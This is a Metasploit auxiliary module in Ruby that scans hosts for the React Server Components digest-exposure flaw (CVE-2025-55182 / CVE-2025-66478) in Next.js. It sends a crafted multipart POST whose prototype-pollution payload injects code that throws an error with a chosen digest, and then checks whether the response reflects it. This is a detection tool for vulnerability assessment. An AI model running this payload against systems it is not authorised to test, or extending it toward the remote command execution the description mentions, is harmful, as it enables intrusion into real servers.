require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Next.js / React RSC Digest Exposure Scanner (CVE-2025-55182 / CVE-2025-66478)',
      'Description' => %q{
This module scans for React Server Components (RSC) digest exposure
vulnerabilities related to:

- CVE-2025-55182 (React2Shell)
- CVE-2025-66478 (Next.js RSC)

The vulnerability allows attackers to inject crafted RSC payloads
that cause the server to throw NEXT_REDIRECT errors with attacker-
controlled digest values. In vulnerable configurations, this behavior
can lead to further exploitation such as remote command execution.

This module performs a safe detection by sending a controlled payload
and checking for digest reflection in the HTTP response.
},
      'Author'      => [ 'hxorz <aisnnu@gmail.com>' ],
      'License'     => MSF_LICENSE,
      'References'  => [
        [ 'CVE', '2025-55182' ],
        [ 'CVE', '2025-66478' ],
        [ 'URL', 'https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478' ],
        [ 'URL', 'https://github.com/msanft/CVE-2025-55182' ],
        [ 'URL', 'https://github.com/subzer0x0/React2Shell' ]
      ],
      'DisclosureDate' => '2025-12-08'
    ))

    register_options(
      [
        Opt::RPORT(3000),
        OptString.new('TARGETURI', [ true, 'Base path', '/' ]),
        OptInt.new('TIMEOUT', [ true, 'HTTP timeout', 10 ])
      ]
    )
  end

  def run_host(ip)
    print_status("Scanning #{ip}:#{rport}")

    payload = <<~DATA
------hxorzboundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'msf-test-digest'})"}}
------hxorzboundary--
DATA

    res = send_request_raw({
      'method'  => 'POST',
      'uri'     => normalize_uri(datastore['TARGETURI']),
      'headers' => {
        'Next-Action'   => 'x',
        'Content-Type' => 'multipart/form-data; boundary=----hxorzboundary'
      },
      'data'    => payload
    }, datastore['TIMEOUT'])

    return unless res

    if res.body =~ /^1:E\{.*"digest":.*\}/m
      print_good("VULNERABLE: RSC digest exposure detected on #{ip}:#{rport}")
    elsif res.code == 500 && res.headers['Content-Type']&.include?('text/x-component')
      if res.body.include?('digest')
        print_good("POTENTIALLY VULNERABLE: Unstable digest behavior on #{ip}:#{rport}")
      else
        print_status("RSC channel detected but no digest reflection on #{ip}:#{rport}")
      end
    else
      print_status("No RSC digest behavior detected on #{ip}:#{rport}")
    end
  end
end

